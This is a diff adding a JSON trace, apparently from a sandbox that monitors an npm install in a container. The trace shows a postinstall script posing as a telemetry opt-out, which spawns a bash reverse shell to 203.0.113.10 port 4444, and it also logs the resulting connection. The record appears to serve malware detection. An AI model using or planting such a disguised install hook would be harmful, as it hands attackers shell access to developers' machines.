@@ -1,0 +1,78 @@
+{
+  "job_id": "98e5cb6a-28c1-4315-8110-eec02d136b0a",
+  "status": "completed",
+  "exit_code": 0,
+  "duration_s": 2.9,
+  "exec_events": [
+    {
+      "ts": "2026-11-01T14:14:39.678960772Z",
+      "pid": 34893,
+      "ppid": 34869,
+      "binary": "/usr/local/bin/docker-entrypoint.sh",
+      "args": "/usr/local/bin/docker-entrypoint.sh npm install --no-audit --no-fund",
+      "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:39.681254045Z",
+      "pid": 34893,
+      "ppid": 34893,
+      "binary": "/usr/local/bin/npm",
+      "args": "node /usr/local/bin/npm install --no-audit --no-fund",
+      "parent_binary": "/usr/local/bin/docker-entrypoint.sh",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:39.682003173Z",
+      "pid": 34893,
+      "ppid": 34893,
+      "binary": "/usr/local/bin/node",
+      "args": "/usr/local/bin/npm install --no-audit --no-fund",
+      "parent_binary": "/usr/local/bin/npm",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:40.123837853Z",
+      "pid": 34948,
+      "ppid": 34893,
+      "binary": "/usr/bin/sh",
+      "args": "-c \"node scripts/telemetry-optout.js\"",
+      "parent_binary": "/usr/local/bin/node",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:40.124943680Z",
+      "pid": 34949,
+      "ppid": 34948,
+      "binary": "/usr/local/bin/node",
+      "args": "scripts/telemetry-optout.js",
+      "parent_binary": "/usr/bin/sh",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:40.158353381Z",
+      "pid": 34956,
+      "ppid": 34949,
+      "binary": "/usr/bin/bash",
+      "args": "-c \"bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\"",
+      "parent_binary": "/usr/local/bin/node",
+      "uid": 10001
+    }
+  ],
+  "connect_events": [
+    {
+      "ts": "2026-11-01T14:14:40.160540830Z",
+      "pid": 34957,
+      "binary": "/usr/bin/bash",
+      "daddr": "203.0.113.10",
+      "dport": 4444,
+      "family": "AF_INET",
+      "resolved_domain": null
+    }
+  ],
+  "dns_queries": [],
+  "stdout_tail": "\n> demo-target@1.0.0 postinstall\n> node scripts/telemetry-optout.js\n\ntelemetry: opted out\n\nup to date in 392ms\n",
+  "stderr_tail": "",
+  "truncated": false,
+  "error": null
+}
